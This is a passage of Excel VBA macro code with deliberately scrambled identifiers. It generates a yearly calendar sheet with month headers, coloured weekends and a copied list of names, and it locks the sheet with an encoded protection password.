    klwierkuhjergkjbdfgh = Application.InputBox("Welches jhsgdfjhgzeewfff?", "Jahreseingabe", 2006, Type:=1)
    If klwierkuhjergkjbdfgh = False Then
    Worksheets(lkhjkldjhrgdfg("ª©ÒÚÜ")).Protect Password:=lkhjkldjhrgdfg("B®²ËÜ")
    Exit Sub
    End If

    If klwierkuhjergkjbdfgh &lt; 1900 Then
    Worksheets(lkhjkldjhrgdfg("ª©ÒÚÜ")).Protect Password:=lkhjkldjhrgdfg("B®²ËÜ")
    Exit Sub
    End If
    Range("A1:AG339").Clear
    Range("B1:AG339").Interior.ColorIndex = 0
    lrkitkerhtkjsgdfg = Worksheets(lkhjkldjhrgdfg("¶·ÚÓã¿èÒÍ¡")).Range("A29").Value
    Namen1 = 0
    For ilukahrtiugsaugjf = 1 To 12 Step 1
        Cells(ilukahrtiugsaugjf * (lrkitkerhtkjsgdfg + 3) - lrkitkerhtkjsgdfg, 2) = Format(DateSerial(klwierkuhjergkjbdfgh, ilukahrtiugsaugjf, 1), "MMMM")
        If ilukahrtiugsaugjf = 1 Or ilukahrtiugsaugjf = 4 Or ilukahrtiugsaugjf = 7 Or ilukahrtiugsaugjf = 10 Then
        Range(Cells(ilukahrtiugsaugjf * (lrkitkerhtkjsgdfg + 3) - lrkitkerhtkjsgdfg, 1), Cells(ilukahrtiugsaugjf * (lrkitkerhtkjsgdfg + 3) - lrkitkerhtkjsgdfg + 5, 1)).Select
        Call jhsgdfjhgzeewfff
        End If
    Cells(ilukahrtiugsaugjf * (lrkitkerhtkjsgdfg + 3) - lrkitkerhtkjsgdfg, 2).Select
    Selection.Borders(xlDiagonalDown).LineStyle = xlNone
    Selection.Borders(xlDiagonalUp).LineStyle = xlNone
    With Selection.Borders(xlEdgeLeft)
        .LineStyle = xlContinuous
        .Weight = xlMedium
        .ColorIndex = xlAutomatic
    End With
    With Selection.Borders(xlEdgeTop)
        .LineStyle = xlContinuous
        .Weight = xlMedium
        .ColorIndex = xlAutomatic
    End With
    With Selection.Borders(xlEdgeBottom)
        .LineStyle = xlContinuous
        .Weight = xlMedium
        .ColorIndex = xlAutomatic
    End With
    With Selection.Borders(xlEdgeRight)
        .LineStyle = xlContinuous
        .Weight = xlMedium
        .ColorIndex = xlAutomatic
    End With
    Selection.Font.Bold = True
        For kjhtkjhgrtdfhg = 1 To Day(DateSerial(klwierkuhjergkjbdfgh, ilukahrtiugsaugjf + 1, 0))
            Cells(ilukahrtiugsaugjf * (lrkitkerhtkjsgdfg + 3) - lrkitkerhtkjsgdfg, kjhtkjhgrtdfhg + 2) = Format(DateSerial(klwierkuhjergkjbdfgh, ilukahrtiugsaugjf, kjhtkjhgrtdfhg), "DD")
            Cells(ilukahrtiugsaugjf * (lrkitkerhtkjsgdfg + 3) - lrkitkerhtkjsgdfg + 1, kjhtkjhgrtdfhg + 2) = Format(DateSerial(klwierkuhjergkjbdfgh, ilukahrtiugsaugjf, kjhtkjhgrtdfhg), "DDD")
            If Weekday(DateSerial(klwierkuhjergkjbdfgh, ilukahrtiugsaugjf, kjhtkjhgrtdfhg)) = vbSaturday Then
            Worksheets(lkhjkldjhrgdfg("ª©ÒÚÜ")).Cells(ilukahrtiugsaugjf * (lrkitkerhtkjsgdfg + 3) - lrkitkerhtkjsgdfg, kjhtkjhgrtdfhg + 2).Interior.ColorIndex = 6
            Else 'End If
                If Weekday(DateSerial(klwierkuhjergkjbdfgh, ilukahrtiugsaugjf, kjhtkjhgrtdfhg)) = vbSunday Then
                Worksheets(lkhjkldjhrgdfg("ª©ÒÚÜ")).Cells(ilukahrtiugsaugjf * (lrkitkerhtkjsgdfg + 3) - lrkitkerhtkjsgdfg, kjhtkjhgrtdfhg + 2).Interior.ColorIndex = 3
                End If
            End If
        Next kjhtkjhgrtdfhg
        For kljshtkjghsdfjkhdfgaa = 1 To lrkitkerhtkjsgdfg
        Cells(kljshtkjghsdfjkhdfgaa + 4 + Namen1, 2) = Worksheets(lkhjkldjhrgdfg("¶·ÚÓã¿èÒÍ¡")).Cells(kljshtkjghsdfjkhdfgaa + 3, 1)
        Next kljshtkjghsdfjkhdfgaa
        Namen1 = ilukahrtiugsaugjf * (kljshtkjghsdfjkhdfgaa + 2)


    Next ilukahrtiugsaugjf
    Application.ScreenUpdating = True
    Range("B2:AG337").Rows.AutoFit
    Range("B2:AG337").Columns.AutoFit
    Range("B2:AG337").HorizontalAlignment = xlCenter
    Call jhzewrtuzgsss
Worksheets(lkhjkldjhrgdfg("ª©ÒÚÜ")).Protect Password:=lkhjkldjhrgdfg("B®²ËÜ")
End Sub

Sub kjhswrkljh()
Worksheets(lkhjkldjhrgdfg("ª©ÒÚÜ")).Unprotect Password:=lkhjkldjhrgdfg("B®²ËÜ")
Selection.Interior.ColorIndex = 34
Worksheets(lkhjkldjhrgdfg("ª©ÒÚÜ")).Protect Password:=lkhjkldjhrgdfg("B®²ËÜ")
End Sub

Sub hjsdfg()
Worksheets(lkhjkldjhrgdfg("ª©ÒÚÜ")).Unprotect Password:=lkhjkldjhrgdfg("B®²ËÜ")
Selection.Interior.ColorIndex = 0
Worksheets(lkhjkldjhrgdfg("ª©ÒÚÜ")).Protect Password:=lkhjkldjhrgdfg("B®²ËÜ")
End Sub

Sub kdsasds()
Worksheets(lkhjkldjhrgdfg("ª©ÒÚÜ")).Unprotect Password:=lkhjkldjhrgdfg("B®²ËÜ")
Selection.Interior.ColorIndex = 35
Worksheets(lkhjkldjhrgdfg("ª©ÒÚÜ")).Protect Password:=lkhjkldjhrgdfg("B®²ËÜ")
End Sub

Sub kljhjkjhg()
Worksheets(lkhjkldjhrgdfg("¶·ÚÓã¿èÒÍ¡")).Select
End Sub

Sub kjhekwrhaaff()
Worksheets(lkhjkldjhrgdfg("ª©ÒÚÜ")).Select
End Sub


Sub jhzewrtuzgsss()

Dim jsudfgjshhdhhddf As Long
    jsudfgjshhdhhddf = Cells(Rows.Count, 3).End(xlUp).Row _
    + Worksheets(lkhjkldjhrgdfg("¶·ÚÓã¿èÒÍ¡")).Range("A29").Value + 2
Application.ScreenUpdating = False
    Range(Cells(3, 3), Cells(jsudfgjshhdhhddf, 33)).Select
    Selection.Borders(xlDiagonalDown).LineStyle = xlNone
    Selection.Borders(xlDiagonalUp).LineStyle = xlNone
    With Selection.Borders(xlEdgeLeft)
        .LineStyle = xlContinuous
        .Weight = xlHairline
        .ColorIndex = xlAutomatic
    End With
    With Selection.Borders(xlEdgeTop)
        .LineStyle = xlContinuous
        .Weight = xlHairline
        .ColorIndex = xlAutomatic
    End With
    With Selection.Borders(xlEdgeBottom)
        .LineStyle = xlContinuous
        .Weight = xlHairline
        .ColorIndex = xlAutomatic
    End With
    With Selection.Borders(xlEdgeRight)
        .LineStyle = xlContinuous
        .Weight = xlHairline
        .ColorIndex = xlAutomatic
    End With
    With Selection.Borders(xlInsideVertical)
        .LineStyle = xlContinuous
        .Weight = xlHairline
        .ColorIndex = xlAutomatic
    End With
    With Selection.Borders(xlInsideHorizontal)
        .LineStyle = xlContinuous
        .Weight = xlHairline
        .ColorIndex = xlAutomatic
    End With
Cells(1, 1).Select
Application.ScreenUpdating = True


End Sub





Sub jhsgdfjhgzeewfff()

    Cells(ilukahrtiugsaugjf * (lrkitkerhtkjsgdfg + 3) - lrkitkerhtkjsgdfg, 1) = klwierkuhjergkjbdfgh

    With Selection
        .HorizontalAlignment = xlCenter
        .VerticalAlignment = xlBottom
        .WrapText = False
        .Orientation = 0
        .AddIndent = False
        .ShrinkToFit = False
        .MergeCells = False
    End With
    Selection.Merge
    With Selection
        .HorizontalAlignment = xlCenter
        .VerticalAlignment = xlCenter
        .WrapText = False
        .Orientation = 90
        .AddIndent = False
        .ShrinkToFit = False
        .MergeCells = True
    End With
    Selection.Borders(xlDiagonalDown).LineStyle = xlNone
    Selection.Borders(xlDiagonalUp).LineStyle = xlNone
    With Selection.Borders(xlEdgeLeft)
        .LineStyle = xlContinuous
        .Weight = xlThick
        .ColorIndex = xlAutomatic
    End With
    With Selection.Borders(xlEdgeTop)
        .LineStyle = xlContinuous
        .Weight = xlThick
        .ColorIndex = xlAutomatic
    End With
    With Selection.Borders(xlEdgeBottom)
        .LineStyle = xlContinuous
        .Weight = xlThick
        .ColorIndex = xlAutomatic
    End With
    With Selection.Borders(xlEdgeRight)
        .LineStyle = xlContinuous
        .Weight = xlThick
        .ColorIndex = xlAutomatic
    End With
    Selection.Borders(xlInsideHorizontal).LineStyle = xlNone
    With Selection.Font
        .Name = "Arial"
        .Size = 14
        .Strikethrough = False
        .Superscript = False
        .Subscript = False
        .OutlineFont = False
        .Shadow = False
        .Underline = xlUnderlineStyleNone
        .ColorIndex = xlAutomatic
    End With
    Selection.Font.Bold = True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